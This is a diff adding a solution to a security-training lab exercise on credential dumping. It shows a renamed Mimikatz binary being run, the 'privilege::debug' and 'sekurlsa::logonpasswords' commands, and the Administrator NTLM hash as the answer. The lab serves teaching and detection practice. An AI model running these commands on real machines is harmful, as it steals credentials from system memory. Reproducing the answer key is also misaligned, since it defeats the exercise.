@@ -203,3 +203,21 @@ SHA256: 8A3CD3CF2249E9971806B15C75A892E6A44CCA5FF5EA5CA89FDA951CD2C09AA9
 ```
 
 3. Replicate the Credential Dumping attack described in this section and provide the NTLM hash of the Administrator user as your answer. "C:\Tools\Sysmon" and "C:\Tools\Mimikatz" on the spawned target contain everything you need.
+
+```pwsh
+cd C:\Tools\Mimikatz
+
+.\AgentEXE.exe
+```
+
+```pwsh
+# mimikatz
+
+privilege::debug
+
+sekurlsa::logonpasswords
+```
+
+```pwsh
+NTLM     : 5e4ffd54b3849aa720ed39f50185e533
+```
